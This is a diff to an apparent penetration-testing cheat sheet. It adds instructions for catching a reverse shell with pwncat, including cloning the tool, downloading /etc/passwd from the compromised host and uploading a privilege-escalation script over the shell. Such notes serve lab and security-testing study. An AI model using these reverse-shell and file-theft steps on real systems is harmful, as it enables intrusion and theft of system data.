@@ -66,9 +66,17 @@ I think remmina is slow, compared to xfreerdp.
 
 <b>pform@attacker~: </b><code>nc -lnvp 5555</code>
 
-<b>pwncat</b>
+<b>pwncat</b> <code>git clone https://github.com/calebstewart/pwncat.git; cd pwncat</code>
 
 <b>pform@attacker~: </b><code>pwncat -l -p 5555<code>
   
+I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:
+
+<b>pform@local~: </b><code>download /etc/passwd<code>
+
+<b>pform@local~: </b><code>upload ~/super-ninja-scripts/hightech-privesc-0day.py<c/ode>
+
+Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.
+
 
 <h2>To be contiuned...</h2>
